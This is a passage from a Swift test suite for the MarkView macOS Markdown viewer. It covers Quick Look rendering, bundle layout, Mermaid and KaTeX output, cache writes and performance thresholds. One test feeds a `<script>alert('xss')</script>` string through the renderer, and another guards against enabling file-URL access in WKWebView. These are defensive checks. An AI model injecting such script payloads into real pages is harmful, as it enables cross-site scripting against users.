    let document = quickLookPipeline(unicodeMD)
    try expect(document.contains("日本語テスト"), "Unicode headings must be preserved")
    try expect(document.contains("🎉🚀"), "Emoji content must be preserved")
    try expect(document.contains("Ñoño"), "Accented characters must be preserved")
}

runner.test("QL pipeline handles markdown with only whitespace") {
    let document = quickLookPipeline("   \n\n   \t  \n")
    try expect(document.contains("<!DOCTYPE html>"), "Whitespace-only input must produce valid HTML")
}

runner.test("QL pipeline sanitizes output (no raw script injection)") {
    let xssMD = "Hello <script>alert('xss')</script> world"
    let document = quickLookPipeline(xssMD)
    // cmark-gfm with CMARK_OPT_UNSAFE allows raw HTML, but the content should be rendered
    // The inline template doesn't execute scripts since it's static HTML
    try expect(document.contains("<!DOCTYPE html>"), "XSS input must still produce valid HTML")
}

// E2E: Golden file regression for Quick Look pipeline output
print("\n--- Quick Look Pipeline Golden Regression ---")

let firstQLGolden = qlGoldenFilePath(for: "basic")
if firstQLGolden != nil {
    for name in fixtureNames {
        runner.test("QL pipeline \(name) matches golden baseline") {
            let md = try loadFixture("\(name).md")
            let actual = quickLookPipeline(md)
            guard let goldenURL = qlGoldenFilePath(for: name) else {
                throw TestError.fixtureNotFound("expected/quick-look/\(name).html")
            }
            let expected = try String(contentsOf: goldenURL, encoding: .utf8)

            if normalizeHTML(actual) != normalizeHTML(expected) {
                let diffs = computeDiff(expected, actual)
                let diffSummary = diffs.prefix(3).map {
                    "    L\($0.line): expected=\($0.expected.prefix(80)) actual=\($0.actual.prefix(80))"
                }.joined(separator: "\n")
                throw TestError.assertionFailed("QL output changed for \(name).md (\(diffs.count) lines differ):\n\(diffSummary)")
            }
        }
    }
} else {
    print("  ⚠ No Quick Look golden files found. Run with --generate-goldens to create baselines.")
}

// E2E: Bundle structure verification (runs when MarkView.app exists)
print("\n--- Quick Look Bundle E2E ---")

let appBundlePath = "MarkView.app"
let appexPath = "\(appBundlePath)/Contents/PlugIns/MarkViewQuickLook.appex"
let appBundleExists = FileManager.default.fileExists(atPath: appBundlePath)

if appBundleExists {
    // Automation fix: scan ALL *.bundle directories in Contents/Resources/ rather than
    // hardcoding bundle names. When SPM target names change or new bundles are added,
    // no test updates required — the scanner finds the resource automatically.
    func resourceExistsInBundle(_ filename: String) -> Bool {
        let resourcesDir = "\(appBundlePath)/Contents/Resources"

        // 1. Check direct path (Xcode ad-hoc builds)
        if FileManager.default.fileExists(atPath: "\(resourcesDir)/\(filename)") { return true }

        // 2. Scan all *.bundle directories for the resource (handles any SPM bundle name)
        let bundles = (try? FileManager.default.contentsOfDirectory(atPath: resourcesDir))?
            .filter { $0.hasSuffix(".bundle") } ?? []
        for bundle in bundles {
            let paths = [
                "\(resourcesDir)/\(bundle)/Contents/Resources/\(filename)",  // SPM bundle layout
                "\(resourcesDir)/\(bundle)/Resources/\(filename)",           // legacy layout
                "\(resourcesDir)/\(bundle)/\(filename)",                     // flat layout
            ]
            if paths.contains(where: { FileManager.default.fileExists(atPath: $0) }) { return true }
        }
        return false
    }

    runner.test("App bundle contains template.html") {
        try expect(resourceExistsInBundle("template.html"),
            "template.html must exist in MarkView_MarkViewCore.bundle, MarkView_MarkView.bundle, or Contents/Resources/")
    }

    runner.test("App bundle contains prism-bundle.min.js") {
        try expect(resourceExistsInBundle("prism-bundle.min.js"),
            "prism-bundle.min.js must exist in MarkView_MarkViewCore.bundle, MarkView_MarkView.bundle, or Contents/Resources/")
    }

    runner.test("App bundle contains mermaid.min.js") {
        try expect(resourceExistsInBundle("mermaid.min.js"),
            "mermaid.min.js must exist in app bundle (MarkView_MarkViewCore.bundle)")
    }

    // Runtime resource load tests — verify resources are actually loadable via Bundle API.
    func loadResourceBundle() -> Bundle? {
        // Scan all *.bundle dirs; return the first one that contains template.html.
        // This is bundle-name-agnostic — works regardless of SPM target renaming.
        let resourcesDir = "\(appBundlePath)/Contents/Resources"
        let bundles = (try? FileManager.default.contentsOfDirectory(atPath: resourcesDir))?
            .filter { $0.hasSuffix(".bundle") } ?? []
        for bundleName in bundles {
            let bundlePath = "\(resourcesDir)/\(bundleName)"
            if let b = Bundle(path: bundlePath) {
                // Check if this bundle contains our resources (any layout)
                let has = b.url(forResource: "template", withExtension: "html") != nil
                    || b.url(forResource: "template", withExtension: "html", subdirectory: "Resources") != nil
                if has { return b }
            }
        }
        return Bundle(path: appBundlePath)
    }

    runner.test("Runtime: template.html loadable from app bundle") {
        let resourceBundle = loadResourceBundle()
        // SPM-managed resources land at Contents/Resources/ inside the bundle (no subdirectory needed)
        let templateURL = resourceBundle?.url(forResource: "template", withExtension: "html")
            ?? resourceBundle?.url(forResource: "template", withExtension: "html", subdirectory: "Resources")
        try expect(templateURL != nil, "template.html must be loadable via Bundle resource lookup (not just file existence)")
        if let url = templateURL {
            let content = try String(contentsOf: url, encoding: .utf8)
            try expect(content.contains(TemplateConstants.contentPlaceholder),
                "template.html must contain \(TemplateConstants.contentPlaceholder) placeholder")
            try expect(content.contains("id=\"\(TemplateConstants.contentElementID)\""),
                "template.html must contain article with id=\"\(TemplateConstants.contentElementID)\"")
        }
    }

    runner.test("Runtime: prism-bundle.min.js loadable from app bundle") {
        let resourceBundle = loadResourceBundle()
        let prismURL = resourceBundle?.url(forResource: "prism-bundle.min", withExtension: "js")
            ?? resourceBundle?.url(forResource: "prism-bundle.min", withExtension: "js", subdirectory: "Resources")
        try expect(prismURL != nil, "prism-bundle.min.js must be loadable via Bundle resource lookup")
    }

    runner.test("App bundle contains PlugIns directory") {
        let pluginsPath = "\(appBundlePath)/Contents/PlugIns"
        try expect(FileManager.default.fileExists(atPath: pluginsPath),
            "MarkView.app must contain Contents/PlugIns/")
    }

    runner.test("Quick Look .appex bundle exists") {
        try expect(FileManager.default.fileExists(atPath: appexPath),
            "MarkViewQuickLook.appex must exist in Contents/PlugIns/")
    }

    runner.test("Quick Look .appex has executable") {
        let execPath = "\(appexPath)/Contents/MacOS/MarkViewQuickLook"
        try expect(FileManager.default.fileExists(atPath: execPath),
            "MarkViewQuickLook.appex must contain MacOS/MarkViewQuickLook executable")
    }

    runner.test("Quick Look .appex has Info.plist") {
        let plistPath = "\(appexPath)/Contents/Info.plist"
        try expect(FileManager.default.fileExists(atPath: plistPath),
            "MarkViewQuickLook.appex must contain Info.plist")
    }

    runner.test("Quick Look .appex has PkgInfo") {
        let pkgInfoPath = "\(appexPath)/Contents/PkgInfo"
        try expect(FileManager.default.fileExists(atPath: pkgInfoPath),
            "MarkViewQuickLook.appex must contain PkgInfo")
    }

    runner.test("Quick Look .appex PkgInfo has XPC type") {
        let pkgInfoPath = "\(appexPath)/Contents/PkgInfo"
        let pkgInfo = try String(contentsOfFile: pkgInfoPath, encoding: .utf8)
        try expect(pkgInfo.hasPrefix("XPC!"), "PkgInfo must start with XPC! for extension bundles")
    }

    runner.test("Quick Look .appex Info.plist is valid") {
        let plistPath = "\(appexPath)/Contents/Info.plist"
        let plistData = try Data(contentsOf: URL(fileURLWithPath: plistPath))
        let plist = try PropertyListSerialization.propertyList(from: plistData, format: nil) as? [String: Any]
        try expect(plist != nil, "Info.plist must be a valid property list")

        let nsExtension = plist?["NSExtension"] as? [String: Any]
        try expect(nsExtension != nil, "Info.plist must contain NSExtension dictionary")

        let extensionPoint = nsExtension?["NSExtensionPointIdentifier"] as? String
        try expect(extensionPoint == "com.apple.quicklook.preview",
            "Extension point must be com.apple.quicklook.preview, got: \(extensionPoint ?? "nil")")
    }

    runner.test("Quick Look .appex declares markdown content type") {
        let plistPath = "\(appexPath)/Contents/Info.plist"
        let plistData = try Data(contentsOf: URL(fileURLWithPath: plistPath))
        let plist = try PropertyListSerialization.propertyList(from: plistData, format: nil) as? [String: Any]
        // QLSupportedContentTypes lives inside NSExtension > NSExtensionAttributes (not top-level)
        let nsExtension = plist?["NSExtension"] as? [String: Any]
        let attrs = nsExtension?["NSExtensionAttributes"] as? [String: Any]
        let contentTypes = attrs?["QLSupportedContentTypes"] as? [String] ?? []
        try expect(contentTypes.contains("net.daringfireball.markdown"),
            "QLSupportedContentTypes must include net.daringfireball.markdown (inside NSExtensionAttributes)")
    }

    runner.test("Quick Look .appex is code-signed") {
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/usr/bin/codesign")
        process.arguments = ["--verify", "--no-strict", appexPath]
        process.standardOutput = Pipe()
        process.standardError = Pipe()
        try process.run()
        process.waitUntilExit()
        try expect(process.terminationStatus == 0,
            "Quick Look .appex must be code-signed (codesign --verify failed)")
    }
} else {
    print("  ⊘ App bundle not found — skipping bundle E2E tests (run: bash scripts/bundle.sh)")
}

// =============================================================================
// MARK: - WindowFileTracker safety (source-level verification)
// =============================================================================

print("")
print("--- WindowFileTracker Safety ---")

runner.test("WindowFileTracker has no closeDuplicateWindow method") {
    let source = try String(contentsOfFile: "Sources/MarkView/MarkViewApp.swift", encoding: .utf8)
    try expect(!source.contains("func closeDuplicateWindow"),
        "closeDuplicateWindow must be removed — it causes the window-closing race condition")
}

runner.test("WindowFileTracker has no closeOtherWindows method") {
    let source = try String(contentsOfFile: "Sources/MarkView/MarkViewApp.swift", encoding: .utf8)
    try expect(!source.contains("func closeOtherWindows"),
        "closeOtherWindows must be removed — it causes the window-closing race condition")
}

runner.test("ContentView.registerFileInWindow does not call closeDuplicateWindow") {
    let source = try String(contentsOfFile: "Sources/MarkView/ContentView.swift", encoding: .utf8)
    try expect(!source.contains("closeDuplicateWindow"),
        "registerFileInWindow must not call closeDuplicateWindow")
}

runner.test("ContentView.registerFileInWindow does not call closeOtherWindows") {
    let source = try String(contentsOfFile: "Sources/MarkView/ContentView.swift", encoding: .utf8)
    try expect(!source.contains("closeOtherWindows"),
        "registerFileInWindow must not call closeOtherWindows")
}

runner.test("AppDelegate intercepts file opens") {
    let source = try String(contentsOfFile: "Sources/MarkView/MarkViewApp.swift", encoding: .utf8)
    try expect(source.contains("class AppDelegate"),
        "AppDelegate must exist to intercept file-open events")
    try expect(source.contains("func application(_ application: NSApplication, open urls: [URL])"),
        "AppDelegate must implement application(_:open:)")
    try expect(source.contains("@NSApplicationDelegateAdaptor"),
        "MarkViewApp must register AppDelegate via @NSApplicationDelegateAdaptor")
}

runner.test("MarkViewApp observes AppDelegate.pendingFilePath") {
    let source = try String(contentsOfFile: "Sources/MarkView/MarkViewApp.swift", encoding: .utf8)
    try expect(source.contains("pendingFilePath"),
        "MarkViewApp must observe appDelegate.pendingFilePath for Finder file opens")
}

runner.test("MarkViewApp uses Window (not WindowGroup) for single-window enforcement") {
    let source = try String(contentsOfFile: "Sources/MarkView/MarkViewApp.swift", encoding: .utf8)
    try expect(source.contains("Window(\"MarkView\", id: \"main\")"),
        "Must use Window scene (not WindowGroup) to guarantee exactly one window")
    // Check for actual WindowGroup { usage (not just mentions in comments)
    try expect(!source.contains("WindowGroup {"),
        "WindowGroup must not be used — it allows SwiftUI to create duplicate windows")
}

// =============================================================================
// MARK: - WKWebView Security Tests
// =============================================================================

print("")
print("--- WKWebView Security ---")

runner.test("WebPreviewView does NOT enable allowFileAccessFromFileURLs") {
    let source = try String(contentsOfFile: "Sources/MarkView/WebPreviewView.swift", encoding: .utf8)
    // Check there is no active (non-commented) line enabling this dangerous preference
    let lines = source.components(separatedBy: "\n")
    let activeLines = lines.filter { line in
        let trimmed = line.trimmingCharacters(in: .whitespaces)
        return !trimmed.hasPrefix("//") && trimmed.contains("allowFileAccessFromFileURLs")
    }
    try expect(activeLines.isEmpty,
        "allowFileAccessFromFileURLs must NOT be enabled — it allows JS to fetch arbitrary file:// URLs via XSS. Found: \(activeLines)")
}


// =============================================================================
// MARK: - Mermaid Rendering Tests
// =============================================================================

print("\n=== Tier 1: Mermaid Rendering (cmark-gfm contract) ===")

runner.test("mermaid fenced code block produces language-mermaid class") {
    // cmark-gfm MUST wrap mermaid blocks as <pre><code class="language-mermaid">
    // This is the contract that the JS bridge relies on to find and convert diagrams.
    let md = "```mermaid\nflowchart LR\n    A --> B\n```"
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("language-mermaid"),
        "cmark-gfm must output class=\"language-mermaid\" for mermaid fenced blocks")
    try expect(hasOpenTag("pre", in: html), "Mermaid block must be wrapped in <pre>")
    try expect(html.contains("<code"), "Mermaid block must be wrapped in <code>")
}

runner.test("mermaid block content is preserved verbatim") {
    // The JS bridge reads code.textContent — content must survive cmark encoding unchanged
    let diagramSource = "flowchart LR\n    A[Start] --> B[End]"
    let md = "```mermaid\n\(diagramSource)\n```"
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("flowchart LR"), "Diagram type must be preserved")
    try expect(html.contains("A[Start]"), "Node labels must be preserved in output")
    try expect(html.contains("B[End]"), "Node labels must be preserved in output")
}

runner.test("multiple mermaid blocks all get language-mermaid class") {
    let md = """
    ```mermaid
    flowchart LR
        A --> B
    ```

    Some text between diagrams.

    ```mermaid
    sequenceDiagram
        Alice->>Bob: Hello
    ```
    """
    let html = MarkdownRenderer.renderHTML(from: md)
    let count = html.components(separatedBy: "language-mermaid").count - 1
    try expect(count == 2, "Expected 2 mermaid blocks, found \(count)")
}

runner.test("mermaid fixture renders non-empty output") {
    let md = try loadFixture("mermaid.md")
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(!html.isEmpty, "mermaid.md produced empty output")
    try expect(html.count > 100, "mermaid.md output suspiciously short: \(html.count) chars")
}

runner.test("mermaid fixture: all diagram types produce code blocks") {
    let md = try loadFixture("mermaid.md")
    let html = MarkdownRenderer.renderHTML(from: md)
    let count = html.components(separatedBy: "language-mermaid").count - 1
    // mermaid.md has 6 mermaid blocks (flowchart, sequence, class, pie, git, state)
    try expect(count >= 6, "Expected at least 6 mermaid code blocks in fixture, found \(count)")
}

runner.test("mermaid fixture: non-mermaid content renders normally alongside diagrams") {
    let md = try loadFixture("mermaid.md")
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(hasTag("h1", in: html, containing: "Mermaid Diagram Test"), "h1 heading missing")
    try expect(hasTag("h2", in: html, containing: "Flowchart"), "Flowchart section missing")
    try expect(hasTag("h2", in: html, containing: "Sequence"), "Sequence section missing")
    try expect(hasOpenTag("table", in: html), "Table in fixture must render")
    try expect(html.contains("language-mermaid"), "Mermaid blocks must be present")
}

runner.test("mermaid flowchart syntax is preserved in cmark output") {
    // cmark HTML-encodes '>' as '&gt;' in code blocks, so '-->' becomes '--&gt;'.
    // This is correct: the JS bridge uses code.textContent which decodes HTML entities,
    // giving Mermaid the original '-->' string for diagram rendering.
    let md = "```mermaid\nflowchart TD\n    A --> B\n    B -->|label| C\n```"
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("flowchart TD"), "flowchart TD directive preserved")
    // Arrow is HTML-encoded in the raw HTML output (decoded by textContent in the browser)
    try expect(html.contains("--&gt;") || html.contains("-->"),
        "Arrow syntax must be present in cmark output (encoded as --&gt; or raw -->)")
}

runner.test("mermaid sequence diagram syntax is preserved") {
    let md = "```mermaid\nsequenceDiagram\n    Alice->>Bob: Hello\n    Bob-->>Alice: Hi\n```"
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("sequenceDiagram"), "sequenceDiagram directive preserved")
    try expect(html.contains("Alice"), "Participant names preserved")
}

runner.test("mermaid class diagram syntax is preserved") {
    let md = "```mermaid\nclassDiagram\n    class Foo {\n        +bar() String\n    }\n```"
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("classDiagram"), "classDiagram directive preserved")
}

runner.test("mermaid block with special chars does not break HTML structure") {
    // Angle brackets inside mermaid must be HTML-escaped by cmark but not double-escaped
    let md = "```mermaid\nflowchart LR\n    A[\"<start>\"] --> B\n```"
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("language-mermaid"), "Block still renders with angle brackets")
    try expect(!html.contains("<start>"),
        "Raw angle bracket inside code block must be HTML-escaped to prevent XSS")
}

print("\n=== Tier 2: Mermaid Integration (WebPreviewView source contracts) ===")

runner.test("mermaid.min.js resource exists in expected location") {
    let mermaidPath = "Sources/MarkViewCore/Resources/mermaid.min.js"
    let exists = FileManager.default.fileExists(atPath: mermaidPath)
    try expect(exists, "mermaid.min.js must exist at \(mermaidPath)")
}

runner.test("mermaid.min.js is non-empty and contains mermaid API") {
    let mermaidPath = "Sources/MarkViewCore/Resources/mermaid.min.js"
    let content = try String(contentsOfFile: mermaidPath, encoding: .utf8)
    try expect(!content.isEmpty, "mermaid.min.js must not be empty")
    // The bundle must expose the mermaid global
    try expect(content.contains("mermaid") || content.contains("Mermaid"),
        "mermaid.min.js must contain mermaid API code")
    try expect(content.count > 100_000, "mermaid.min.js seems too small — may be truncated or corrupt")
}

runner.test("template.html .mermaid svg CSS specifies explicit width for fluid scaling") {
    // CSS must also specify width:100% on .mermaid svg so the rule applies even
    // when JS post-processing hasn't fired yet (e.g. slow Mermaid init).
    let templatePath = "Sources/MarkViewCore/Resources/template.html"
    let template = try String(contentsOfFile: templatePath, encoding: .utf8)
    // Find the .mermaid svg rule
    guard let svgRuleStart = template.range(of: ".mermaid svg") else {
        throw TestError.assertionFailed("No .mermaid svg rule in template.html")
    }
    let afterRule = String(template[svgRuleStart.upperBound...].prefix(150))
    try expect(afterRule.contains("width: 100%"),
        ".mermaid svg CSS must include width: 100% so diagrams fill the pane before JS fires")
    try expect(afterRule.contains("height: auto"),
        ".mermaid svg CSS must include height: auto for proportional scaling")
}

// =============================================================================
// MARK: - Preview Pane Live Update Pipeline (source-code contracts)
// =============================================================================


// =============================================================================
// MARK: - Export functionality regression tests
// =============================================================================
// Both exportHTML and exportPDF notifications must be wired in ContentView.
// Previously exportPDF notification was posted but never received — clicking
// "Export PDF..." in the menu did nothing.


runner.test("mermaid CSS positions diagrams correctly") {
    let templatePath = "Sources/MarkViewCore/Resources/template.html"
    let template = try String(contentsOfFile: templatePath, encoding: .utf8)
    // Find the .mermaid CSS rule
    guard let mermaidRange = template.range(of: ".mermaid") else {
        throw TestError.assertionFailed("No .mermaid CSS rule found in template.html")
    }
    let afterMermaid = String(template[mermaidRange.upperBound...].prefix(200))
    try expect(afterMermaid.contains("margin-bottom"),
        "Mermaid container must have margin-bottom for spacing")
    try expect(template.contains(".mermaid svg"),
        "template.html must have CSS for .mermaid svg to constrain diagram size")
    try expect(template.contains("max-width: 100%"),
        ".mermaid svg must have max-width: 100% to prevent overflow on narrow viewports")
}

// =============================================================================
// MARK: - MCP preview_markdown cache path tests
// Regression for NSCocoaErrorDomain Code 260:
// preview_markdown must write to ~/.cache/markview/previews/ (persistent),
// NOT to NSTemporaryDirectory() which macOS cleans aggressively.

runner.test("MCP cache directory is writable") {
    let cacheDir = FileManager.default.homeDirectoryForCurrentUser
        .appendingPathComponent(".cache/markview/previews")
    try FileManager.default.createDirectory(at: cacheDir, withIntermediateDirectories: true)
    let probe = cacheDir.appendingPathComponent("_writetest-\(Int.random(in: 1000...9999)).md")
    defer { try? FileManager.default.removeItem(at: probe) }
    let body = "# Write Test"
    try body.write(to: probe, atomically: true, encoding: .utf8)
    let read = try String(contentsOf: probe, encoding: .utf8)
    try expect(read == body, "Cache write-then-read must return identical content")
}

runner.test("MCP preview content update overwrites (not appends) — live-reload regression") {
    let cacheDir = FileManager.default.homeDirectoryForCurrentUser
        .appendingPathComponent(".cache/markview/previews")
    try FileManager.default.createDirectory(at: cacheDir, withIntermediateDirectories: true)
    let file = cacheDir.appendingPathComponent("_overwrite-regression.md")
    defer { try? FileManager.default.removeItem(at: file) }
    let v1 = "# Version 1\n\nOriginal."
    let v2 = "# Version 2\n\n**Updated** — FileWatcher should see this."
    try v1.write(to: file, atomically: true, encoding: .utf8)
    try v2.write(to: file, atomically: true, encoding: .utf8)
    let result = try String(contentsOf: file, encoding: .utf8)
    try expect(result == v2, "Second write must fully replace first — FileWatcher fires on the updated file")
    try expect(!result.contains("Version 1"), "Old content must not survive after overwrite")
}

// =============================================================================
// MARK: - Performance Benchmarks (NSLayoutManager glyph-fill hang detection)
// Regression for: rendering large markdown files (1000+ lines) causes 2000ms+ hangs
// because MarkdownRenderer.renderHTML runs synchronously on the main thread.

/// Generate a large markdown document with realistic content
func generateLargeMarkdown(lineCount: Int) -> String {
    var content = ""
    let headers = (0..<(lineCount / 100)).map { "# Header \($0)\n\n" }
    let paragraphs = (0..<(lineCount / 50)).map { i -> String in
        return """
        This is paragraph \(i) with some content.

        """
    }
    let codeBlocks = (0..<(lineCount / 200)).map { i -> String in
        return """
        ```swift
        // Code block \(i)
        func example\(i)() {
            let result = calculateSomething\(i)()
            return result
        }
        ```

        """
    }
    let tables = (0..<(lineCount / 300)).map { i -> String in
        return """
        | Column A | Column B | Column C |
        |----------|----------|----------|
        | Row \(i) A1 | Row \(i) B1 | Row \(i) C1 |
        | Row \(i) A2 | Row \(i) B2 | Row \(i) C2 |

        """
    }
    let mermaidDiagrams = (0..<(lineCount / 500)).map { i -> String in
        return """
        ```mermaid
        graph TD
            A[Node \(i)A] --> B[Node \(i)B]
            B --> C[Node \(i)C]
            C --> D[Node \(i)D]
        ```

        """
    }

    for header in headers { content += header }
    for para in paragraphs { content += para }
    for code in codeBlocks { content += code }
    for table in tables { content += table }
    for diagram in mermaidDiagrams { content += diagram }

    return content
}

runner.test("Performance: 1000-line markdown renders in <500ms") {
    let markdown = generateLargeMarkdown(lineCount: 1000)
    let start = Date()
    let html = MarkdownRenderer.renderHTML(from: markdown)
    let elapsed = Date().timeIntervalSince(start) * 1000 // Convert to milliseconds

    try expect(!html.isEmpty, "Large markdown must produce HTML output")
    try expect(html.contains("<!DOCTYPE html>") || html.count > 0,
        "Rendered HTML must be valid")

    if elapsed > 500 {
        throw TestError.assertionFailed(
            "1000-line render took \(String(format: "%.2f", elapsed))ms, threshold is 500ms (ANR risk)")
    }
    print("    └─ Actual time: \(String(format: "%.2f", elapsed))ms")
}

runner.test("Performance: 5000-line markdown renders in <2000ms") {
    let markdown = generateLargeMarkdown(lineCount: 5000)
    let start = Date()
    let html = MarkdownRenderer.renderHTML(from: markdown)
    let elapsed = Date().timeIntervalSince(start) * 1000 // Convert to milliseconds

    try expect(!html.isEmpty, "Large markdown must produce HTML output")
    try expect(html.contains("<!DOCTYPE html>") || html.count > 0,
        "Rendered HTML must be valid")

    if elapsed > 2000 {
        throw TestError.assertionFailed(
            "5000-line render took \(String(format: "%.2f", elapsed))ms, threshold is 2000ms (Sentry ANR limit)")
    }
    print("    └─ Actual time: \(String(format: "%.2f", elapsed))ms")
}

runner.test("Performance: 10000-line markdown renders in <5000ms") {
    let markdown = generateLargeMarkdown(lineCount: 10000)
    let start = Date()
    let html = MarkdownRenderer.renderHTML(from: markdown)
    let elapsed = Date().timeIntervalSince(start) * 1000 // Convert to milliseconds

    try expect(!html.isEmpty, "Large markdown must produce HTML output")
    try expect(html.contains("<!DOCTYPE html>") || html.count > 0,
        "Rendered HTML must be valid")

    if elapsed > 5000 {
        throw TestError.assertionFailed(
            "10000-line render took \(String(format: "%.2f", elapsed))ms, threshold is 5000ms (degradation limit)")
    }
    print("    └─ Actual time: \(String(format: "%.2f", elapsed))ms")
}

runner.test("Performance: Markdown with many tables (100) renders in <1000ms") {
    var content = ""
    for i in 0..<100 {
        content += """
        ## Table \(i)
        | A | B | C |
        |-|-|-|
        | 1\(i) | 2\(i) | 3\(i) |
        | 4\(i) | 5\(i) | 6\(i) |

        """
    }

    let start = Date()
    let html = MarkdownRenderer.renderHTML(from: content)
    let elapsed = Date().timeIntervalSince(start) * 1000

    try expect(!html.isEmpty, "Table-heavy markdown must produce output")

    if elapsed > 1000 {
        throw TestError.assertionFailed(
            "100-table render took \(String(format: "%.2f", elapsed))ms, threshold is 1000ms")
    }
    print("    └─ Actual time: \(String(format: "%.2f", elapsed))ms")
}

runner.test("Performance: Markdown with many code blocks (100) renders in <1000ms") {
    var content = ""
    for i in 0..<100 {
        content += """
        ## Block \(i)
        ```swift
        func example\(i)() -> Int {
            return \(i)
        }
        ```

        """
    }

    let start = Date()
    let html = MarkdownRenderer.renderHTML(from: content)
    let elapsed = Date().timeIntervalSince(start) * 1000

    try expect(!html.isEmpty, "Code-block-heavy markdown must produce output")

    if elapsed > 1000 {
        throw TestError.assertionFailed(
            "100-block render took \(String(format: "%.2f", elapsed))ms, threshold is 1000ms")
    }
    print("    └─ Actual time: \(String(format: "%.2f", elapsed))ms")
}

// MARK: - Known Gaps (documented, not silently missing)
// These behaviors exist but cannot be unit-tested from MarkViewTestRunner
// because they live in MarkViewApp (not MarkViewCore) or require a running UI.
//
// ⊘ inlineLocalImages (data URI conversion):
//   Implemented in WebPreviewView.swift (MarkViewApp target).
//   Cannot be imported by MarkViewTestRunner (SPM library boundary).
//   Covered indirectly: E2E file-open tests exercise this path at runtime.
//   To test directly: move inlineLocalImages to MarkViewCore in a future refactor.
//
// ⊘ PDF export menu → print dialog:
//   Requires interactive NSPrintPanel automation (no headless API).
//   Validated structurally by source.contains tests + PDFTester for output quality.
//   Manual checklist item before each release.
//
// ⊘ Find panel in WKWebView preview:
//   WKWebView find requires browser-level JS event simulation.
//   Menu item wiring tested by E2E tester (Find bar appears on Cmd+F).
//   Full find-and-highlight flow requires AX permission + UI automation.
//
// ⊘ Scroll position sync (editor ↔ preview):
//   Bidirectional sync requires measuring live DOM scroll positions.
//   No headless API for WKWebView scroll state inspection.
//   Tested manually during development; regression requires E2E with AX.

// =============================================================================
// Golden Corpus — exercises every supported feature
// =============================================================================

runner.test("golden-corpus.md renders all major sections") {
    let md = try loadFixture("golden-corpus.md")
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(!html.isEmpty, "golden corpus rendered to empty string")
    // Typography
    try expect(html.contains("<strong>"), "Missing bold")
    try expect(html.contains("<em>"), "Missing italic")
    try expect(html.contains("<del>"), "Missing strikethrough")
    // Tables
    try expect(html.contains("<table"), "Missing table")
    try expect(html.contains("<th"), "Missing table header")
    // Task lists
    try expect(html.contains("type=\"checkbox\""), "Missing task list checkboxes")
    try expect(html.contains("checked"), "Missing checked task item")
    // Code blocks
    try expect(html.contains("language-swift"), "Missing Swift code block")
    try expect(html.contains("language-python"), "Missing Python code block")
    try expect(html.contains("language-mermaid"), "Missing Mermaid code block")
    // Math passes through as raw text (KaTeX runs client-side)
    try expect(html.contains("mc^2"), "Math content not preserved")
    try expect(html.contains("sqrt"), "Math sqrt not preserved")
    // Mermaid code blocks
    try expect(html.contains("flowchart"), "Missing Mermaid flowchart")
    try expect(html.contains("sequenceDiagram"), "Missing Mermaid sequence")
    // GFM alerts as blockquotes (JS transforms client-side)
    try expect(html.contains("[!NOTE]"), "Missing NOTE alert")
    try expect(html.contains("[!WARNING]"), "Missing WARNING alert")
    try expect(html.contains("[!TIP]"), "Missing TIP alert")
    // Footnotes
    try expect(html.contains("fn") || html.contains("footnote"), "Missing footnotes")
    // Unicode
    try expect(html.contains("マークビュー"), "Missing Japanese unicode")
    try expect(html.contains("\u{1F680}"), "Missing emoji")
}

// =============================================================================
// KaTeX + GFM Alerts
// =============================================================================

runner.test("math.md fixture: math content passes through renderer") {
    let md = try loadFixture("math.md")
    let html = MarkdownRenderer.renderHTML(from: md)
    // cmark renders math as raw text — KaTeX runs client-side in WKWebView
    try expect(html.contains("mc^2") || html.contains("mc"), "Math content not present in rendered HTML")
    try expect(!html.isEmpty, "math.md rendered to empty string")
}

runner.test("gfm-alerts.md fixture: alert blockquotes render") {
    let md = try loadFixture("gfm-alerts.md")
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("<blockquote"), "Missing blockquote in gfm-alerts.md")
    // [!NOTE] etc. present as raw text — JS transforms to styled divs client-side
    try expect(html.contains("[!NOTE]"), "[!NOTE] content not found in rendered HTML")
    try expect(html.contains("[!WARNING]"), "[!WARNING] content not found in rendered HTML")
    try expect(html.contains("[!TIP]"), "[!TIP] content not found in rendered HTML")
}

runner.test("script injection: mermaid.min.js contains </body> literals (DOMPurify regression guard)") {
    // mermaid.min.js bundles DOMPurify which contains "</body></html>" as string literals.
    // The original inject functions used replacingOccurrences(of: "</body>", ...) which
    // replaced ALL occurrences — including the 2 inside mermaid.min.js already injected —
    // causing KaTeX injection to corrupt the mermaid script and render JS source as visible
    // text. Root cause confirmed Apr 4 2026. Fix: insertBeforeBodyClose uses .backwards search
    // to replace only the actual final </body> closing tag.
    let mermaidPath = FileManager.default.currentDirectoryPath + "/Sources/MarkViewCore/Resources/mermaid.min.js"
    let webPreviewPath = FileManager.default.currentDirectoryPath + "/Sources/MarkView/WebPreviewView.swift"
    if FileManager.default.fileExists(atPath: mermaidPath) {
        let mermaid = try String(contentsOfFile: mermaidPath, encoding: .utf8)
        // Confirm the JS bundle actually contains the problematic pattern
        try expect(mermaid.contains("</body>"), "mermaid.min.js must contain </body> literal — if missing, DOMPurify was removed from bundle and guard is still harmless")
        // Confirm the fix is in place: all inject calls use insertBeforeBodyClose
        let webPreview = try String(contentsOfFile: webPreviewPath, encoding: .utf8)
        try expect(webPreview.contains("insertBeforeBodyClose"), "WebPreviewView must use insertBeforeBodyClose (backwards-search replace) for all script injections")
        let forwardReplaceCount = webPreview.components(separatedBy: "replacingOccurrences(of: \"</body>\"").count - 1
        try expect(forwardReplaceCount == 0, "No inject function should use forward replacingOccurrences(of: \"</body>\") — use insertBeforeBodyClose instead (found \(forwardReplaceCount) violations)")
    }
}

runner.test("gfm-alerts: regular blockquote is unaffected") {
    let md = "> This is a regular blockquote without an alert prefix."
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("<blockquote"), "Regular blockquote should still render as blockquote")
    try expect(!html.contains("[!"), "Regular blockquote should not contain alert markers")
}

// =============================================================================

// =============================================================================
// Full-Pipeline Injection Tests (HTMLPipeline)
// =============================================================================
// These tests cover the layer previously untestable because injection lived in
